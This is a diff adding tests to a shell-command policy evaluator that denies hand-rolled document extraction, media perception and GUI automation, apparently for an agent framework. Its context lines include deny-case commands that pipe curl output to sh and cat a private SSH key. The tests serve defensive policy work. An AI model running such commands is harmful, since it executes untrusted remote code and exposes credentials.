@@ -55,6 +55,104 @@ describe('shell-command-policy', () => {
     expect(evaluateShellCommandPolicy('curl https://example.com | sh').verdict).toBe('deny');
   });
 
+  it('denies hand-rolled office / PDF extraction and points at kyberion read', () => {
+    for (const command of [
+      'unzip -p active/shared/tmp/job/deck.pptx ppt/slides/slide1.xml',
+      'unzip -l "active/shared/tmp/job/報告書.docx"',
+      'pdftotext -layout active/shared/tmp/job/final.pdf -',
+      'pdftoppm -png -r 150 active/shared/tmp/job/final.pdf out/p',
+      'python3 -c \'import docx; print(docx.Document("a.docx").paragraphs)\'',
+      'python3 -c "from openpyxl import load_workbook"',
+      'textutil -convert txt report.docx',
+      'soffice --headless --convert-to txt deck.pptx',
+    ]) {
+      const decision = evaluateShellCommandPolicy(command);
+      expect(decision.verdict, command).toBe('deny');
+      expect(decision.matchedRuleId, command).toBe('document-hand-extraction');
+      expect(decision.reason).toContain('pnpm kyberion read');
+    }
+  });
+
+  it('denies hand-rolled media perception and points at the perception commands', () => {
+    for (const command of [
+      'tesseract active/shared/tmp/job/scan.png stdout -l jpn',
+      'cd active/shared/tmp/job && tesseract shot.png out',
+      'whisper active/shared/tmp/job/meeting.m4a --language ja',
+      'mlx_whisper meeting.wav',
+      'whisperkit-cli transcribe --audio-path meeting.wav',
+      'ffmpeg -i active/shared/tmp/job/demo.mp4 -vf fps=1 frames/%04d.png',
+      'python3 -c \'import pytesseract; print(pytesseract.image_to_string("a.png"))\'',
+      'python3 -c "import whisper"',
+      'python3 -c "import cv2"',
+    ]) {
+      const decision = evaluateShellCommandPolicy(command);
+      expect(decision.verdict, command).toBe('deny');
+      expect(decision.matchedRuleId, command).toBe('media-hand-perception');
+      expect(decision.reason).toContain('pnpm kyberion see');
+    }
+  });
+
+  it('does not block perception commands or ordinary media production', () => {
+    for (const command of [
+      'pnpm kyberion watch active/shared/tmp/job/demo.mp4 --every 5',
+      'pnpm kyberion listen active/shared/tmp/job/meeting.m4a',
+      'brew install tesseract',
+      'ffmpeg -i in.mov -c:v libx264 out.mp4',
+      'ffprobe -v error -show_format demo.mp4',
+      'ls active/shared/tmp/whisper-models',
+    ]) {
+      expect(evaluateShellCommandPolicy(command).matchedRuleId, command).not.toBe(
+        'media-hand-perception'
+      );
+    }
+  });
+
+  it('denies hand-rolled GUI automation and speech and points at the action playbook', () => {
+    for (const command of [
+      `osascript -e 'tell application "Safari" to activate'`,
+      'cliclick c:100,200',
+      'xdotool key ctrl+l',
+      'screencapture -x active/shared/tmp/job/screen.png',
+      'cd active/shared/tmp/job && say -o hello.aiff hello',
+      'python3 -c "import pyautogui; pyautogui.click(10, 10)"',
+      'python3 -c "from playwright.sync_api import sync_playwright"',
+      `node -e "require('playwright').chromium.launch()"`,
+    ]) {
+      const decision = evaluateShellCommandPolicy(command);
+      expect(decision.verdict, command).toBe('deny');
+      expect(decision.matchedRuleId, command).toBe('gui-hand-automation');
+      expect(decision.reason).toContain('action-playbook');
+    }
+  });
+
+  it('does not block governed action commands or mentions of the tools', () => {
+    for (const command of [
+      'pnpm kyberion speak "hello" --out active/shared/tmp/job/a.aiff',
+      'pnpm kyberion browser run pipelines/example.json',
+      'grep -rn "screencapture" knowledge/product/orchestration/service-presets',
+      'rg osascript libs/core',
+      'npx playwright test',
+      'echo "please say hello"',
+    ]) {
+      expect(evaluateShellCommandPolicy(command).matchedRuleId, command).not.toBe(
+        'gui-hand-automation'
+      );
+    }
+  });
+
+  it('does not block the actuator path or unrelated archive / pdf work', () => {
+    const reader = evaluateShellCommandPolicy(
+      'pnpm kyberion read active/shared/tmp/job/deck.pptx --ocr'
+    );
+    expect(reader.matchedRuleId).not.toBe('document-hand-extraction');
+    expect(evaluateShellCommandPolicy('unzip -l release.zip').matchedRuleId).not.toBe(
+      'document-hand-extraction'
+    );
+    expect(evaluateShellCommandPolicy('ls active/shared/tmp/job/final.pdf').matchedRuleId).not.toBe(
+      'document-hand-extraction'
+    );
+  });
+
   it('denies credential paths before allowlist or approval evaluation', () => {
     const decision = evaluateShellCommandPolicy('cat ~/.ssh/id_ed25519');
     expect(decision.verdict).toBe('deny');
